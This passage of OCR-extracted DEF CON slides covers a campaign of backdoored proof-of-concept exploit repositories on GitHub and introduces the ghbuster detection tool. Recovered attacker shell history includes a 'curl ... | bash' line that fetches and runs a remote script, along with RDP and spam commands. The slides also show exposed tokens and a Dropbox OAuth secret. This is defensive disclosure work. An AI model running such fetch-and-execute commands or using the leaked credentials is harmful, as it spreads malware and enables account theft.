Credentials & Highlights
© Software Developer at Cryptozen
& Studied at Manipal Institute Of
Technology (MIT)
© Lives in The United States of
America 2018-present
© 464 content views 27 this month
6 Joined September 2022
Knows about
Solidity Programming Language
3 answers
=
=== The United States of America
—
& Manipal Institute Of Technology (MIT)
Software and Applications
View more V
More
```

## Slide 75


> Recovered by OCR — confidence 78/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Home > Bapaxonka > Ycnyru, cepBicbl as
All Activity
By user8492
30 Sep 2022, 16:56 in Ycnyru, cepBucbl
« Share
user8492 Posted 30 Sep 2022, 16:56
Hosuukn MOKHO, OCOGEHHO Ha He OYEHb NONyNAPHbIX KOHTpakTax.
@7 https://www.tokenrecovery.today
```

## Slide 76


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bits.media Forum Blogs Events Downloads Activity Rules
Forums
Home (1 Flea market (1 Services Activity
Experimental utility for restoring erc20 tokens mistakenly sent to a contract address
Author user8492
30 Sep 2022, 15:56in Services
O Share
user8492 Published30 Sep 2022, 15:56
It often happens that ERC20 tokens are mistakenly sent to the address of some contract. The result is the loss of tokens, since usually even the creators cannot extract tokens
from the contract. The tokenrecovery utility tries to extract tokens by unconventional methods, using the SWA loopholes of the contract that accepted the tokens. The probability
) of recovery is not high, but you can try, especially on not very popular contracts.
Newbies https://www.tokenrecovery.today <q
```

## Slide 77

## Slide 78

## Slide 79


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
€ cvepoc @cvepoc - 14 Jan 4 _
\ fileiois dead.
The API interface, with active tokens, was disabled and the tokens were
invalidated. No warning of the catastrophe has been ever made.
\ Great job, file.io! )
```

## Slide 80


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
/ How | Got Hacked: A Warning about Malicious PoCs
@ Valentin Lobstein”
Introduction
| cloned the repository and ran the script without inspecting its contents.
A few hours later, my system started behaving strangely. CPU usage was abnormally high, and after further investigation, |
stolen and uploaded to an attacker-controlled repository.
As | dug deeper, | discovered that | wasn’t the only victim. The attacker had been collecting stolen data from multiple
time to take it back.
How the malware Was installed
The PoC repository contained a PDF file, which seemed unrelated to the exploit. When | executed the fake PoC, an
embedded script from the PDF file executed in the background, downloading and running three files:
¢ Xsession.sh — The main malware script
¢ xsession.auth — A disguised Monero miner (XMRig)
¢ xprintidle — A utility to detect when the system was idle
The malware installed itself in ~/.local/bin/, made its files executable, and created a systemd service to ensure it
\ yout restart every time my system booted.
Late at night, | was testing a proof-of-concept (PoC) exploit for CVE-2020-35489 (https: //github[.]com/gh202503/poc-cve-
2020-35489) that | found on GitHub. The repository looked legitimate, and in my exhaustion, | skipped the usual precautions.
found that a hidden malware had infected my machine. Worse, my credentials, SSH keys, and other sensitive data had been
systems, storing it in a private Codeberg repository. | had unknowingly handed over access to my system, and now it was
```

## Slide 81

_Reference: https://chocapikk.com/posts/2025/s1nk/_


> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
/ Malicious API Tokens (Used for Exfiltration & Persistence)
1a38a34c6d5dbefb112aa73f54824433f80bb704
Codeberg Repository Used for Storing Stolen Data
https: //codeberg.org/aib0lit/xsession
https: //codeberg.org/bluefisher
Also, this idiot tested the malware on his own instance. | have full access to all of his private SSH keys, which grant
authentication to his GitHub and Codeberg repositories, effectively giving me control over his entire version control
Reference: https://chocapikk.com/posts/2025/s 1nk/
```

## Slide 82


> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ssh root@8@.251.156.59
ssh root@211.23.167.48
ssh root@43.153.214.17
cd ../Spam/
x=$(sqlite3 emails.db "select id from arxiv where sent=false")
echo $x
for i in $x; do echo $i; done
scp sender.sh root@mail.opencompiled.org:/root/spam
```

## Slide 83


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
sudo apt instamll gehex
sudo apt instamll ghex
sudo apt install ghex
xfreerdp /u:
xfreerdp /u:
xfreerdp /u:
xfreerdp /u:
xfreerdp /u:
xfreerdp /u:
"Administrator"
"Administrator"
"Administrator"
"Administrator"
"Administrator"
/p:
/p:
7p:
/p:
/p:
" /timeout:4000 /w:1400 /h:700 /bpp:8 +clipboard
d" /timeout:4000 /w:1400 /h:700 /bpp:8 +clipboard
" /timeout:4000 /w:140@ /h:700 /bpp:8 +clipboard
" /timeout:90000 /w:1400 /h:700 /bpp:8 +clipboard
" /timeout:4000 /w:1400 /h:700 /bpp:8 +clipboard ®
" /timeout:4000 /w:1400 /h:700 /bpp:8 +clipboard /
```

## Slide 84


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
git remote add origin git@github. com: s3nd3rjz/poc-CVE-2020-1938. git
git remote set-url origin git@github. com:piton3rr/poc—cve-2001-1473.git
curl -o- https://raw.githubusercontent.com/opencompiled—oss/kernel-patch/refs/heads/main/patch-mc-@x129.sh | bash
git clone https://github. com/AdrianVollmer/PowerHub. git
git remote set-url origin git@github. com:nod3jzzz/poc-CVE-2019-11248. git
git remote add origin git@github. com:scl3nc3apps/MathWorks—-MATLAB-R2024a-v24. 1. 0.2537033-—x64-LINUX. git
git remote add origin git@github. com: reneww/poc—CVE-2020-25223.git
git remote add origin git@github. com:n@s3ns33/poc—cve-2023-21716.git
1@ git remote add origin git@github. com:n@s3ns33/poc—cve-2023-21716.git
11 git remote set-url orgin git@github. com:n00d3r/poc—cve-2019-11248. git
12 git remote set-url origin git@github. com:n00d3r/poc—cve-2019-11248. git
13 cat ~/.ssh/gh-githubb001. pub
14 git remote set-url origin git@github. com:g1thubb001/poc—CVE-2019-11248. git
15 git remote set-url origin git@github.com:aibO@litt/poc-CVE-2020-1938.git
16 ssh-keygen /home/user/.ssh/gh-githubb0e2 ~~
17 ssh-keygen -f /home/user/.ssh/gh-githubb0e2
18 cat ~/.ssh/gh-githubb@@2. pub
19 git remote set-url origin git@github. com: g1ithubb002/poc—CVE-2020-35489. git
20 cat ~/.ssh/gh-githubb@@4. pub
21 git remote set-url origin git@github. com:githubb@04/poc—CVE-2024-5057.git
22 rm gh-githubb@e*
23 git remote add origin git@github. com: gh-2025-02/poc—cve-2020-25223. git
24 git remote add origin git@github. com: gh202503/poc—cve-2020-35489. git
25 git clone https://github.com/gtk-gnutella/gtk-gnutella
26 git remote add origin git@github. com: c33d3r20/shareaza—for-Linux. git
27 git remote add origin git@github.com:allenbit/cheatengine—for—Linux.git
28 git remote add origin git@github. com:PavelMarchine/ansys—for-Linux.git
29 git remote add origin git@github. com:alexmarshal120/poc—cve-2019-11248. git
```

## Slide 85


> Recovered by OCR — confidence 84/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(0 Overview © Repositories [Fj Projects © Packages vy Stars
Popular repositories
aibOlit doesn't have any public repositories yet.
0 contributions in the last year (205
Jul Aug Sep Oct Nov Dec Jan Feb Mar Apr May Jun Jul 2024
Mon
Wed 2023
Fri
ALA? 2022
aibOlit Learn how we count contributions Less @@@ More
2021
Follow
Contribution activity 2020
Block or Report
July 2025, 2019
aibOlit has no activity yet for this period. 2018
2017
Show more activity
```

## Slide 86


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
stable-diffusion-webui-forge
<> Code © Issues 13k 11 Pullrequests 21 @) Discussions © Security ~ Insights
[Bug]: Final image is not displayed in Ul when output folder is NTFS link #255
Checklist
‘The issue exists after disabling all extensions
‘The issue exists on a clean installation of webui
‘The issue is caused by an extension, but | believe itis caused by a bug in the webul
‘The issue exists in the current version of the webui
‘The issue has not been reported before recently
‘The issue has been reported before but has not
en fixed yet
What happened?
Q Type (7]to search
Assignees
No one assigned
Labels
Projects
No projects
Milestone
HTTP headers: <> Code © Issues 11k TL Pullrequests 21 © Discussions © Security |~ Insights
[Bug]: Live preview broken #133
fA bolit opened on Feb 8, 2024 s+ Assignees
- No one assigned
‘Checklist
Labels
‘The issue exists after disabling all extensions No et
The issue exists on a clean installation of webui
‘The issue is caused by an extension, but | believe itis caused by a bug in the webui Projects
‘The issue exists in the current version of the webu No projects
‘The issue has not been reported before recently
Milestone
‘The issue has been reported before but has not been fixed yet i"
What happened?
After today update live preview stopped working, but it worked fine yesterday. Config files stay unchanged since yesterday.
After replacing webui folder from webui_forge_cu121_torch21.7z (downloaded Feb. 06) live preview working, but if you run
None yet
Development
Steps to reproduce the problem Code with agent mode >
```

## Slide 87


> Recovered by OCR — confidence 74/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
& aibOlit on Feb 13, 2024
You can just use ntfs links without touching .cmd files. Here is example using Total Commander
CI NTFS-links.mp4 ~
® Total Commander 8.52a - PowerUser v67_ Bc 11 ges 2024 18:08:49 Mamate: 12% LIN: 4%
webui stable-diffusion-webui
4Tun
<Manxa> 11.02.24 18:07 t <Nanxa> 26.08.23 21:05
<Manxa> 11.02.24 18:05 @ Appdata <Manxa> 26.08.23 19:56
github <Manxa> 06.02.24 22:54 <Manxa> 08.02.24 22:43
@ pycache <Manxa> 08.02.24 23:06 <Nanxa> 23.01.23 23:04
@ config states <Mankxa> 06.02.24 03:42 42K6 25.07.23 15:38
s <Manxa> 06.02.24 22:54
@2 embeddings <Manxa> 06.02.24 22:54
@s extensions <Mankxa> 08.02.24 23:00
xtensions-builtin <Manxa> 10.02.24 12:43
@s javascript <Manxa> 06.02.24 22-54
@a localizations <Manxa> 06.02.24 22-54
<Manxa> 11.02.24 18:07
<Manxa> 11.02.24 18:05
<Manxa> 11.02.24 18:05
<Ccunkxa> 07.02.24 15:56
<Manxa> 07.02.24 21:34
<Manxa> 08.02.24 23:12
```

## Slide 88

### **Detecting inauthentic and weaponized GitHub repositories**

## Slide 89

#### **Related research**

<u>https://www.reversinglabs.com/blog/threat-actor-banana-squad-exploits-github-repos-in-new-campaign https://www.kaspersky.com/blog/malicious-code-in-github/53085/</u>

## Slide 90

#### **Related research**

<u>https://patricegodefroid.github.io/public_psfiles/icse2021.pdf</u>


> Recovered by OCR — confidence 78/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Anomalicious: Automated Detection of Anomalous
and Potentially Malicious Commits on GitHub
Related research
Danielle Gonzalez Thomas Zimmermann, Patrice Godefroid Max Schifer
Rochester Institute of Technology Microsoft Research GitHub
pg@microsoft.com
[-SuperMario-FR-|5_| 180_| 98 | Octopus Scanner | Yes |
| JavaPacman | 2 | 238 | 5 | Octopus Scanner |
| ProyectoFiguras [2 | 21 | 8 | Octopus Scanner |
=
4
https://patricegodefroid.github.io/public_psfiles/icse2021.pdf
```

## Slide 91

#### **Related research**

<u>https://dl.acm.org/doi/pdf/10.1145/3589335.3651582</u>


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Related research Who is Creating Malware Repositories on GitHub and Why?
Nishat Ara Tania Md Rayhanul Masud Md Omar Faruk Rokon
University of California Riverside University of California Riverside Walmart Global Tech
Computer Science Computer Science Advertisement Technology
ntani005@ucr.edu mmasu012@ucr.edu mdomarfaruk.rokon@walmart.com
Qian Zhang Michalis Faloutsos
University of California Riverside University of California Riverside
Computer Science Computer Science
qzhang@cs.ucr.edu michalis@cs.ucr.edu
Table 1: Distribution of Availability of User Profile Fields
Profile Field Malicious(%) Pied (2) Benign(%)
70.07
10.03
403
1176
Organizational 2.27
```

## Slide 92

#### **Related research**

"Out of the 47,285 GitHub repositories containing PoCs, we detected 899 malicious repositories, which **accounts for approximately 1.9% of the total.** "

<u>https://arxiv.org/pdf/2210.08374</u>

## Slide 93

**ghbuster**

## Slide 94

#### **ghbuster**

➢ Analyze GitHub user metadata (profile, forks…)

➢ Analyze GitHub repository metadata (commits, stargazers..)


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
> Analyze GitHub user metadata (profile, forks...)
> Analyze GitHub repository metadata (commits, stargazers..)
ghbuster
A tool to identify and investigate inauthentic
GitHub user accounts and repositories.
@ Python WwW 0 Bo © 0 wl Q Updated 1 hour ago
```

## Slide 95

**Demo**

## Slide 96

**Wrapping up**

## Slide 97


> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Phishing email Trojanized GitHub Trojanized GitHub Trojanized Wordpress
repositories (cluster 1) repositories (cluster 2) credentials checker
Exfiltration
opencompiled.org @xengine/meow @xengine/xmlrpc
Codeberg
k@rn66/xmrdropper
Exfiltration
```

## Slide 98

#### **tl;dl**

➢ Proof-of-concept exploits are an attractive target to backdoor

## Slide 99

#### **tl;dl**

➢ Proof-of-concept exploits are an attractive target to backdoor

- ➢ We all run untrusted code (sometimes, all the time)

## Slide 100

#### **tl;dl**

- ➢ Proof-of-concept exploits are an attractive target to backdoor

- ➢ We all run untrusted code (sometimes, all the time)

- ➢ "Making it look legitimate" is a big part of threat actors' work

## Slide 101

#### **tl;dl**

- ➢ Proof-of-concept exploits are an attractive target to backdoor

- ➢ We all run untrusted code (sometimes, all the time)

- ➢ "Making it look legitimate" is a big part of threat actors' work

- ➢ Open datasets are out there. Use them!

## Slide 102

## **Thank you DEF CON**

**github.com/datadog/ghbuster**

## Slide 103

|+---------------+-------+
|    domain     | count ||
|---|
|+---------------+-------+|
|| gmail.com     | 137   ||
|| cam.ac.uk     | 30    ||
|| pku.edu.cn    | 24    ||
|| uchicago.edu  | 19    ||
|| mit.edu       | 18    ||
|| lanl.gov      | 18    ||
|| princeton.edu | 17    ||
|| berkeley.edu  | 16    ||
|| ustc.edu.cn   | 15    |
…|

## Slide 104

$ curl https://api.dropbox.com/oauth2/token \ -d grant_type=refresh_token \ -d client_id=qbknda06b3no1z3 \

-d client_secret=c6j642nz7k2gyuq \

-d refresh_token=ZtRBk4WfngcAAAAAAAAAA..YegPuYhODoh
